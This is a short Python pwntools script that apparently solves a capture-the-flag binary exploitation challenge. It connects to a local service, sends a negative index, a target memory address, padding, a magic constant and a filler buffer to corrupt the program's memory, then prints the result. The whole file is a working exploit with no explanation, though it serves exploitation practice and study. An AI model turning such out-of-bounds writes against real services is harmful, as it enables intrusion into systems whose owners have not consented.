from pwn import *

context(arch='amd64', os='linux')

server = "0.0.0.0"
port = 10000

r = remote(server, port)


raw_input('')
r.sendline(str(0x42))


r.send(p32(-2184, signed=True))
r.send(p32(0x6020d8))

for i in xrange(7):
	r.send(p32(0))
	r.send(p32(0))

MAGIC_NUMBER = 0xc0c0aff6

r.send(p32(MAGIC_NUMBER))
r.sendline('50')
r.send('A'*30)

print r.recvall()


